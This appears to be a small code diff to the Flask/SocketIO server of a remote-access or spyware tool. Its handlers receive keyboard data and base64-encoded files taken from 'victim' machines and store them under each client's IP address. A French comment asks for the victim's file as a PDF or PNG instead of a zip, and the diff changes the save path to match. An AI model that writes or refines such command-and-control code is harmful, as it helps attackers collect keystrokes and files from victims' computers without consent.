@@ -450,7 +450,7 @@ def handle_keyboard(data):
             db.session.add(new_command)
             db.session.commit()
 
-
+#je veux le fichier de la victime en pdf ou png pas en zip
 @socketio.on('pc_victim_response')
 def handle_pc_victim(data):
     sid = request.sid
@@ -459,7 +459,7 @@ def handle_pc_victim(data):
         file_bytes = base64.b64decode(data.get('file'))
         file_dir = f"pc_victims/{client.ip}"
         os.makedirs(file_dir, exist_ok=True)
-        file_path = f"{file_dir}/pc_victim.zip"
+        file_path = f"{file_dir}/file.pdf"
         with open(file_path, 'wb') as f:
             f.write(file_bytes)
         new_command = Command(type=CommandType.PC_VICTIM, client_id=client.id, file_path=file_path)
